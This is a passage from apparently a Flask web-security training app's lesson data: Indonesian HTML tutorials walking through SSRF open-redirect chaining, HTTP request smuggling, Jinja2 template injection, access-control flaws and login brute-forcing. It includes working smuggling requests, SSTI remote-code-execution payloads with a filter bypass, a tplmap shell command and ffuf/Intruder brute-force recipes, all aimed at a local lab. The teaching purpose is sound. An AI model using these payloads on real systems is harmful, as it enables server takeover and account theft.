<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite:</b> Untuk menyusun <i>payload</i> URL bertingkat.</li>
    <li><b>Pemahaman HTTP Redirect:</b> Pengetahuan tentang bagaimana klien HTTP (termasuk pustaka <i>backend</i> seperti <code>requests</code> pada Python) secara default mengikuti pengalihan Location.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab. Perhatikan bahwa di bawah tombol Cek Stok terdapat fitur "Katalog Berikutnya" yang memiliki tautan seperti ini: <code>/lab/ssrf/expert/product/next?path=/katalog2</code>.</li>
<li>Tautan tersebut adalah kerentanan Open Redirect. Ia mengambil nilai dari parameter <code>path</code> dan mengarahkan (<i>redirect</i>) pengguna ke sana.</li>
<li>Susun <i>payload</i> SSRF kita. Kita harus menyetel parameter <code>stockApi</code> agar diawali dengan URL yang sah (whitelist), yaitu <i>endpoint</i> Open Redirect tersebut.</li>
<li>Sebagai tujuan akhir dari <i>redirect</i> (nilai parameter <code>path</code>), kita berikan URL panel admin.</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload Bertingkat:</h3>
<pre>stockApi=http://127.0.0.1:5000/lab/ssrf/expert/product/next?path=http://127.0.0.1:5000/lab/ssrf/admin/delete?username=carlos</pre>
<p>Saat aplikasi memproses input ini: Ia melihat awalan URL sudah sah (lolos filter). Aplikasi kemudian melakukan request, menerima respons 302 Redirect, secara otomatis mengikutinya ke panel admin, dan mengeksekusi penghapusan pengguna!</p>
            """
        }
    },
    "request-smuggling": {
        "apprentice": {
            "title": "HTTP Request Smuggling Dasar (CL.TE)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Lakukan serangan CL.TE untuk menyelundupkan request <code>GPOST</code> ke backend. Simulator akan mendeteksi apakah request Anda berhasil terpecah menjadi dua bagian.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar CL.TE</h3>
<p><b>HTTP Request Smuggling (HRS)</b> terjadi ketika server <i>Front-End</i> (FE) dan <i>Back-End</i> (BE) memiliki cara yang berbeda dalam menentukan batas akhir dari sebuah pesan HTTP.</p>
<p>Pada kerentanan <b>CL.TE (Content-Length / Transfer-Encoding)</b>:<br>
1. Front-End menggunakan header <code>Content-Length</code> (CL).<br>
2. Back-End menggunakan header <code>Transfer-Encoding: chunked</code> (TE).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Repeater):</b> Untuk mengirim <i>request</i> tanpa gangguan format otomatis dari browser. Di dunia nyata, Anda harus mematikan opsi <i>"Update Content-Length"</i> di menu Repeater.</li>
    <li><b>Pemahaman CRLF:</b> Setiap baris HTTP harus diakhiri dengan <code>\\r\\n</code> (Carriage Return & Line Feed).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Analisis & Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Karena kita menjalankan lab ini pada satu server Flask, kita menggunakan <b>Gateway Simulator</b>. Anda cukup menempelkan teks <i>raw HTTP</i> ke dalam form yang disediakan.</li>
<li>Kita akan membuat request di mana <code>Content-Length</code> mencakup seluruh payload (termasuk request selundupan), tetapi deklarasi <i>chunked</i> diakhiri lebih awal (<code>0\\r\\n\\r\\n</code>).</li>
<li>Ketika BE melihat <code>0\\r\\n\\r\\n</code>, ia berhenti memproses request pertama. Sisa teks setelahnya (request selundupan) akan tertahan di <i>buffer</i> soket, menunggu request pengguna berikutnya.</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload CL.TE:</h3>
<pre>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 42
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: vulnerable-website.com</pre>
<p><i>Catatan: Panjang 42 byte dihitung dari awal angka '0' hingga akhir kata 'com'. Pastikan baris kosong benar-benar ditekan Enter (CRLF).</i></p>
            """
        },
        "practitioner": {
            "title": "HTTP Request Smuggling (TE.CL)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Lakukan serangan TE.CL untuk menyelundupkan request ke backend. Di sini, Front-End memproses <i>Transfer-Encoding</i> dan Back-End memproses <i>Content-Length</i>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar TE.CL</h3>
<p>Dalam skenario <b>TE.CL</b>, kebalikannya terjadi:<br>
1. Front-End memproses header <code>Transfer-Encoding: chunked</code> (TE).<br>
2. Back-End memproses header <code>Content-Length</code> (CL).</p>
<p>Penyerang mengirimkan request dengan format <i>chunked</i> yang valid agar dilewatkan oleh FE. Namun, penyerang mengatur <code>Content-Length</code> ke nilai yang sangat kecil (misal: 3 atau 4). Back-End akan membaca sedikit <i>byte</i> saja, dan membiarkan sisa isi (yang merupakan request selundupan) menumpuk di <i>buffer</i>.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan Tambahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Turbo Intruder (Ekstensi Burp):</b> Di dunia nyata, serangan ini sering kali membutuhkan injeksi paket pada tingkat soket (TCP) untuk menghindari normalisasi oleh FE. Turbo Intruder mendukung pengiriman soket mentah.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Salin <i>payload</i> di bawah ini ke dalam Simulator Gateway TE.CL.</li>
<li>Di sini, FE membaca blok berukuran <code>5c</code> (92 byte dalam desimal) dan terus membaca hingga menemukan chunk <code>0</code>.</li>
<li>Namun, BE hanya membaca <code>Content-Length: 4</code> (yang hanya mencakup huruf <code>5c\\r\\n</code>). Sisa data setelahnya langsung dianggap sebagai awal dari HTTP request baru.</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload TE.CL:</h3>
<pre>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

</pre>
            """
        },
        "expert": {
            "title": "TE.TE Behavior: Obfuscating the TE Header",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Gunakan teknik <i>obfuscation</i> (pengaburan) pada header Transfer-Encoding agar Front-End mengabaikannya, memaksa skenario berubah menjadi CL.TE secara <i>de facto</i>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar TE.TE Obfuscation</h3>
<p>Terkadang, baik Front-End maupun Back-End mendukung header <code>Transfer-Encoding</code>. Ini seharusnya mencegah <i>smuggling</i>. Namun, implementasi <i>parser</i> HTTP dari vendor yang berbeda memiliki kelemahan dalam menangani header yang cacat (<i>malformed</i>).</p>
<p>Jika kita dapat mengaburkan (<i>obfuscate</i>) header TE sedemikian rupa sehingga <b>Front-End menolaknya/mengabaikannya</b>, namun <b>Back-End tetap menerimanya</b>, kita pada dasarnya menciptakan kondisi CL.TE buatan.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (HTTP Request Smuggler extension):</b> Alat otomatis terbaik untuk menguji puluhan mutasi header TE (seperti spasi ekstra, karakter tidak terduga, atau kapitalisasi tidak standar).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Kita memanipulasi header TE dengan menambahkan karakter tidak terduga, misalnya spasi sebelum titik dua (<code>Transfer-Encoding : chunked</code>) atau tab.</li>
<li>Pada lab ini, simulator kita dirancang agar Front-End mengabaikan header jika mengandung <code>\\x0b</code> (vertical tab) atau format aneh lainnya, namun Back-End tetap memprosesnya sebagai chunked.</li>
<li>Masukkan <i>payload</i> CL.TE standar, namun modifikasi nama header TE-nya menjadi <code>Transfer-Encoding: xchunked</code> (simulasi mutasi).</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload TE.TE (Simulasi Obfuscation):</h3>
<pre>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 42
Transfer-Encoding: xchunked

0

GPOST / HTTP/1.1
Host: vulnerable-website.com</pre>
            """
        }
    },
    "ssti": {
        "apprentice": {
            "title": "SSTI Dasar pada Mesin Jinja2 (Flask)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Buktikan kerentanan SSTI dengan mengeksekusi operasi matematika, lalu eskalasi menjadi <i>Remote Code Execution (RCE)</i> untuk membaca data dari sistem operasi server.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar SSTI</h3>
<p><b>Server-Side Template Injection (SSTI)</b> terjadi ketika <i>input</i> dari pengguna disisipkan secara tidak aman ke dalam mesin <i>template</i> (seperti Jinja2 di Python, Twig di PHP, atau FreeMarker di Java) lalu dieksekusi secara langsung oleh <i>backend</i>.</p>
<p>Kerentanan ini sangat fatal karena memungkinkan penyerang untuk "kabur" dari batas <i>template</i> dan mengeksekusi kode bahasa pemrograman (Python) di sisi server, yang berujung pada pengambilalihan server (RCE).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Browser & Burp Suite:</b> Untuk mendeteksi injeksi awal secara manual.</li>
    <li><b>Tplmap (Opsional tapi Direkomendasikan):</b> Sebuah <i>tools</i> CLI otomatis (mirip SQLMap) yang didesain khusus untuk mendeteksi dan mengeksploitasi SSTI pada berbagai mesin <i>template</i>.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Identifikasi (Manual)</h3>
<p>Coba ubah parameter <code>name</code> pada URL menjadi ekspresi matematika Jinja2, yaitu <code>{{ 7*7 }}</code>.</p>
<p>URL: <code>/lab/ssti/apprentice?name={{7*7}}</code></p>
<p>Jika server merender hasilnya menjadi <b>49</b>, kita telah berhasil memvalidasi kerentanan SSTI di mesin Jinja2.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Eksploitasi RCE (Manual)</h3>
<p>Untuk Jinja2, kita harus merangkai metode internal Python (<i>Method Resolution Order / MRO</i>) untuk memanggil modul sistem operasi seperti <code>os</code>. Salin <i>payload</i> berikut ke parameter URL (Gunakan Burp Decoder untuk URL-Encoding):</p>
<pre>{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}</pre>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">5. Eksploitasi RCE (Menggunakan Tplmap)</h3>
<p>Di dunia nyata, menyusun RCE secara manual sangat rumit. Gunakan <b>Tplmap</b> di terminal Kali Linux Anda:</p>
<pre>python tplmap.py -u "http://127.0.0.1:5000/lab/ssti/apprentice?name=inject" --os-shell</pre>
<p>Tplmap akan otomatis mendeteksi Jinja2 dan memberi Anda akses <i>shell</i> semu (<i>pseudo-shell</i>) ke dalam server!</p>
            """
        },
        "practitioner": {
            "title": "SSTI dengan Filter Bypass (Karakter Underscore)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksekusi kode sistem operasi pada mesin <i>template</i> yang memiliki mekanisme <i>blacklist</i> untuk memblokir karakter <i>underscore</i> (<code>_</code>).",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Analisis Filter Server</h3>
<p>Jika Anda mencoba menggunakan <i>payload</i> RCE dari level Apprentice pada endpoint <code>/lab/ssti/practitioner</code>, server akan menolak Anda dengan pesan bahwa karakter <code>_</code> (<i>underscore</i>) dilarang.</p>
<p>Ini adalah mitigasi yang buruk karena bahasa pemrograman sering kali memiliki alternatif sintaks (<i>bypass</i>).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Eksploitasi & Teknik Bypass</h3>
<p>Di dalam Jinja2/Python, jika kita tidak bisa menggunakan atribut secara langsung dengan notasi titik karena ada <i>underscore</i> (seperti <code>.__class__</code>), kita bisa menggunakan <i>filter</i> <code>|attr()</code> Jinja2 yang menerima bentuk <i>string</i>.</p>
<p>Selanjutnya, kita merepresentasikan karakter <i>underscore</i> menggunakan format heksadesimal <code>\\x5f</code>.</p>
<p>Uji coba awal (mengembalikan representasi objek Request tanpa menggunakan underscore literal):</p>
<pre>{{ request|attr('\\x5f\\x5fclass\\x5f\\x5f') }}</pre>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Payload RCE Utuh (Hex Bypass)</h3>
<p>Untuk mendapatkan RCE, seluruh kata yang mengandung <code>_</code> harus dienkode. Karena sintaksnya menjadi sangat panjang, lebih mudah menggunakan format ini di parameter URL:</p>
<pre>{{ request|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('whoami')|attr('read')() }}</pre>
            """
        },
        "expert": {
            "title": "Blind SSTI",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Buktikan adanya kerentanan SSTI meskipun aplikasi tidak pernah menampilkan respons evaluasi <i>template</i> ke layar (Blind).",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Konsep Blind SSTI</h3>
<p>Sama seperti Blind SQLi, <b>Blind SSTI</b> terjadi ketika <i>input</i> Anda dikompilasi oleh mesin <i>template</i>, namun hasil eksekusinya dibuang atau diganti dengan pesan statis (seperti "Terima kasih atas pesannya!").</p>
<p>Tanpa melihat hasil evaluasi (misal, 49 dari 7*7), Anda harus bergantung pada anomali waktu (<i>time-delay</i>) atau <i>Out-of-Band (OOB) requests</i>.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Repeater):</b> Untuk mengukur selisih waktu respons (<i>Response Time</i>) dalam satuan milidetik.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Eksploitasi (Time-Based)</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab Expert. Fitur pengisian "Alamat Email" di sini menyimpan email untuk <i>newsletter</i> secara Blind.</li>
<li>Kirim <i>request</i> pengisian email tersebut ke <b>Burp Repeater</b>.</li>
<li>Alih-alih menggunakan OS command seperti <code>whoami</code>, kita akan memanggil pustaka <code>time</code> Python dan memicu fungsi <code>sleep(5)</code>.</li>
</ol>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload Blind SSTI (Delay 5 Detik):</h3>
<pre>{{ request.application.__globals__.__builtins__.__import__('time').sleep(5) }}</pre>
<p>Kirimkan <i>payload</i> ini di parameter <code>email</code>. Jika respons server membutuhkan waktu lebih dari 5 detik untuk kembali kepada Anda, Anda telah berhasil memvalidasi eksekusi kode di server secara Blind!</p>
            """
        }
    },
    "access-control": {
        "apprentice": {
            "title": "Unprotected Admin Functionality",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Temukan panel admin yang tidak terlindungi dan hapus pengguna bernama <code>carlos</code>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar</h3>
<p>Kerentanan fungsi admin yang tidak terlindungi terjadi ketika aplikasi hanya menyembunyikan tautan ke panel admin dari pengguna biasa, tetapi <b>tidak benar-benar menerapkan pembatasan akses (otorisasi)</b> pada <i>backend</i>. Jika penyerang mengetahui atau bisa menebak URL panel tersebut, mereka bisa langsung mengaksesnya.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Browser:</b> Untuk navigasi URL langsung.</li>
    <li><b>DirBuster / Gobuster (Opsional):</b> Alat untuk melakukan <i>brute-force</i> atau menebak direktori tersembunyi pada sebuah server web.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab (Dashboard Pengguna). Anda tidak akan melihat tautan apa pun menuju panel admin.</li>
<li>Kita asumsikan aplikasi ini menggunakan pola penamaan standar. Cobalah memanipulasi URL secara manual di <i>address bar</i> browser Anda.</li>
<li>Tambahkan <code>/admin</code> di akhir URL saat ini, sehingga menjadi: <code>/lab/access-control/apprentice/admin</code>.</li>
<li>Tekan Enter. Halaman panel admin akan terbuka karena server tidak memvalidasi siapa yang mengakses URL tersebut!</li>
<li>Klik tombol <b>Hapus</b> pada baris pengguna Carlos untuk menyelesaikan lab.</li>
</ol>
            """
        },
        "practitioner": {
            "title": "Insecure Direct Object Reference (IDOR)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi kerentanan IDOR untuk membaca isi tiket bantuan (support ticket) rahasia milik pengguna lain.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar IDOR</h3>
<p><b>Insecure Direct Object Reference (IDOR)</b> terjadi ketika aplikasi memberikan akses langsung ke objek (seperti file, database record, atau tiket) berdasarkan input dari pengguna, namun <b>tidak memvalidasi</b> apakah pengguna tersebut berhak (memiliki otoritas) mengakses objek yang diminta.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Repeater):</b> Untuk memodifikasi parameter URL dengan mudah.</li>
    <li><b>Autorize (Ekstensi Burp - Opsional):</b> Untuk pengujian IDOR otomatis.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Di halaman Dashboard, Anda akan melihat tiket bantuan milik Anda sendiri. Klik tombol <b>Lihat Tiket</b>.</li>
<li>Perhatikan URL di browser atau di <i>request</i> Burp Suite Anda. URL tersebut memuat parameter referensi objek langsung, misalnya: <code>?id=1</code>.</li>
<li>Karena aplikasi tidak memeriksa kepemilikan tiket, ubah parameter <code>id</code> tersebut menjadi angka lain untuk melihat tiket pengguna lain.</li>
<li>Ubah URL menjadi <code>?id=2</code> (atau <code>3</code>) dan tekan Enter.</li>
<li>Anda sekarang membaca isi pesan tiket rahasia milik orang lain!</li>
</ol>
            """
        },
        "expert": {
            "title": "Privilege Escalation via Cookie Manipulation",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Lakukan eskalasi hak istimewa (Privilege Escalation) dengan memanipulasi nilai <i>cookie</i> sesi Anda, lalu akses panel admin.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Modifikasi Cookie</h3>
<p>Beberapa aplikasi menggunakan <i>cookie</i> di sisi klien (browser) tidak hanya untuk menyimpan ID Sesi acak, tetapi juga untuk menyimpan data otorisasi yang tidak terenkripsi atau tidak ditandatangani secara kriptografis (seperti <code>role=user</code>).</p>
<p>Jika penyerang dapat membaca dan mengubah <i>cookie</i> tersebut, mereka dapat memanipulasi hak akses mereka (<i>Vertical Privilege Escalation</i>).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Browser Developer Tools (F12):</b> Tab <i>Application</i> (Chrome) atau <i>Storage</i> (Firefox) untuk mengedit <i>cookie</i> langsung di browser.</li>
    <li><b>Cookie Editor (Browser Extension):</b> Untuk manajemen <i>cookie</i> yang lebih praktis.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab. Klik tombol <b>Akses Panel Admin</b>. Aplikasi akan menolak akses Anda dengan pesan "Akses Ditolak: Anda hanya seorang user biasa".</li>
<li>Buka <b>Developer Tools (F12)</b> di browser Anda, dan masuk ke tab <b>Application &gt; Cookies</b> (atau tab Storage).</li>
<li>Cari <i>cookie</i> bernama <code>user_role</code>. Anda akan melihat nilainya saat ini adalah <code>user</code>.</li>
<li>Klik ganda pada nilai tersebut dan ubah menjadi <code>admin</code>.</li>
<li>Kembali ke halaman web, dan klik lagi tombol <b>Akses Panel Admin</b> (atau muat ulang halaman jika Anda sudah berada di sana).</li>
<li>Server kini membaca <i>cookie</i> Anda sebagai admin dan mengizinkan Anda masuk!</li>
</ol>
            """
        }
    },
    "authentication": {
        "apprentice": {
            "title": "Username Enumeration & Password Brute-Force",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Temukan <i>username</i> yang valid melalui perbedaan respons server, lalu lakukan <i>brute-force</i> untuk menebak <i>password</i> dan masuk ke akun pengguna tersebut.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar</h3>
<p><b>Username Enumeration</b> terjadi ketika aplikasi memberikan respons yang berbeda (misalnya pesan error "Username tidak ditemukan" vs "Password salah") saat pengguna mencoba login. Penyerang dapat memanfaatkan ini untuk memvalidasi daftar <i>username</i>, lalu memfokuskan serangan <i>brute-force password</i> hanya pada akun yang terbukti ada.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Intruder):</b> Untuk otomatisasi injeksi <i>payload</i> pada parameter HTTP.</li>
    <li><b>Ffuf / Hydra (Opsional):</b> Alat CLI yang sangat cepat untuk <i>fuzzing</i> dan <i>brute-force</i> web.</li>
    <li><b>Wordlist:</b> Daftar <i>username</i> dan <i>password</i> umum (misal: <code>SecLists/Passwords/Common-Credentials</code>).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi (Enumerasi)</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab, masukkan <i>username</i> acak (misal: <code>test</code>) dan <i>password</i> acak, lalu klik Login.</li>
<li>Tangkap <i>request</i> POST menggunakan Burp Suite, lalu kirim ke <b>Intruder</b>.</li>
<li>Pilih mode <b>Sniper</b>. Tandai nilai parameter <code>username</code> sebagai target <i>payload</i> (<code>username=§test§</code>).</li>
<li>Muat <i>wordlist username</i> (seperti admin, carlos, wiener, root) ke dalam tab <i>Payloads</i>.</li>
<li>Mulai serangan. Urutkan hasil berdasarkan panjang respons (<i>Length</i>). Anda akan melihat satu <i>username</i> (misalnya <code>carlos</code>) mengembalikan pesan "Password salah", sementara yang lain mengembalikan "Username tidak ditemukan".</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Langkah Eksploitasi (Brute-Force)</h3>
<p>Kini setelah Anda mengetahui <i>username</i> yang valid adalah <code>carlos</code>, ubah target Intruder ke parameter <code>password</code> (<code>username=carlos&password=§test§</code>). Muat <i>wordlist password</i> (seperti 123456, password, qwerty), dan serang. <i>Password</i> yang benar akan menghasilkan status 302 Redirect atau pesan "Login Berhasil".</p>
<p><b>Alternatif dengan Ffuf:</b></p>
<pre>ffuf -w passwords.txt -X POST -d "username=carlos&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://127.0.0.1:5000/lab/authentication/apprentice/login -mr "berhasil"</pre>
            """
        },
        "practitioner": {
            "title": "Bypass IP-Based Rate Limiting",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Lakukan <i>brute-force password</i> pada akun <code>carlos</code> dengan mem-<i>bypass</i> mekanisme pemblokiran IP yang membatasi 3 kali percobaan gagal.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Analisis Mekanisme Rate Limiting</h3>
<p>Banyak aplikasi menerapkan pemblokiran berbasis alamat IP untuk mencegah <i>brute-force</i>. Namun, jika aplikasi berada di belakang <i>load balancer</i> atau <i>reverse proxy</i>, developer sering membaca alamat IP pengguna dari HTTP Header seperti <code>X-Forwarded-For</code>.</p>
<p>Jika aplikasi tidak memvalidasi header ini dengan benar, penyerang dapat memalsukan (<i>spoof</i>) alamat IP mereka di setiap <i>request</i>, sehingga membuat sistem mengira setiap percobaan berasal dari orang yang berbeda.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Intruder):</b> Mode <b>Pitchfork</b> sangat direkomendasikan untuk lab ini.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Jika Anda mencoba <i>brute-force</i> biasa, setelah 3 kali gagal, server akan merespons "Akses Ditolak: Terlalu banyak percobaan".</li>
<li>Kirim <i>request</i> login ke <b>Burp Repeater</b>, dan tambahkan baris header baru: <code>X-Forwarded-For: 1.1.1.1</code>. Anda akan menyadari hitungan blokir di-<i>reset</i>.</li>
<li>Kirim <i>request</i> ini ke <b>Burp Intruder</b>.</li>
<li>Pilih Attack Type: <b>Pitchfork</b>. Ini memungkinkan kita menyuntikkan dua <i>payload</i> secara paralel.</li>
<li>Tandai parameter nilai IP dan nilai <i>password</i>: <code>X-Forwarded-For: §1.1.1.1§</code> dan <code>password=§test§</code>.</li>
<li>Di tab <i>Payloads</i>:
    <ul class="list-disc pl-5 mt-2">
        <li><b>Payload 1 (IP):</b> Gunakan tipe <i>Numbers</i> (Sequential) dari 1 hingga 1000.</li>
        <li><b>Payload 2 (Password):</b> Gunakan <i>wordlist password</i> Anda.</li>
    </ul>
</li>
<li>Mulai serangan. Setiap percobaan akan dikirim dengan IP palsu yang berbeda, sehingga <i>rate limit</i> tidak pernah terpicu!</li>
</ol>
            """
        },
        "expert": {
            "title": "Flawed 2FA Implementation",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Lakukan <i>brute-force</i> pada kode PIN 4 digit Two-Factor Authentication (2FA) untuk mengambil alih akun <code>carlos</code>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Kerentanan 2FA</h3>
<p>Two-Factor Authentication (2FA) menambah lapisan keamanan. Namun, jika kode 2FA (biasanya 4 hingga 6 angka) dikirimkan tanpa adanya pembatasan percobaan (<i>rate limiting</i>) pada <i>endpoint</i> verifikasinya, penyerang yang telah mengetahui <i>username</i> dan <i>password</i> korban dapat dengan mudah mencoba semua kombinasi angka yang mungkin.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Intruder)</b> atau <b>Wfuzz</b>.</li>
    <li><b>Macros / Session Handling (Opsional):</b> Jika aplikasi mengeluarkan token CSRF per <i>request</i> (pada lab ini tidak diperlukan untuk mempermudah fokus pada 2FA).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Gunakan kredensial yang bocor (misal <i>username</i>: <code>carlos</code>, <i>password</i>: <code>qwerty</code>) untuk login di langkah pertama.</li>
<li>Anda akan dialihkan ke halaman verifikasi 2FA yang meminta kode 4 digit. Masukkan angka sembarang, misalnya <code>0000</code>.</li>
<li>Tangkap <i>request</i> POST ke <code>/lab/authentication/expert/2fa</code> menggunakan Burp Suite, lalu kirim ke Intruder (Mode <b>Sniper</b>).</li>
<li>Tandai parameter <code>mfa-code</code>: <code>mfa-code=§0000§</code>.</li>
<li>Di tab <i>Payloads</i>, pilih tipe <b>Numbers</b>. Atur <i>From</i>: <code>0</code>, <i>To</i>: <code>9999</code>, dan <i>Step</i>: <code>1</code>.</li>
<li>Penting: Di pengaturan angka, set <b>Min integer digits</b> menjadi <code>4</code> dan <b>Max integer digits</b> menjadi <code>4</code> agar angka di bawah 1000 memiliki awalan nol (misal <code>0012</code>).</li>
<li>Jalankan Intruder. Kode yang benar akan mengembalikan status 302 Redirect yang mengarah ke dashboard rahasia!</li>
</ol>
            """
        }
    },
    "deserialization": {
        "apprentice": {
            "title": "Modifikasi Objek Ter-serialize (Privilege Escalation)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Ubah struktur objek JSON yang di-<i>encode</i> menggunakan Base64 di dalam <i>cookie</i> sesi Anda untuk mendapatkan hak akses admin.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar</h3>
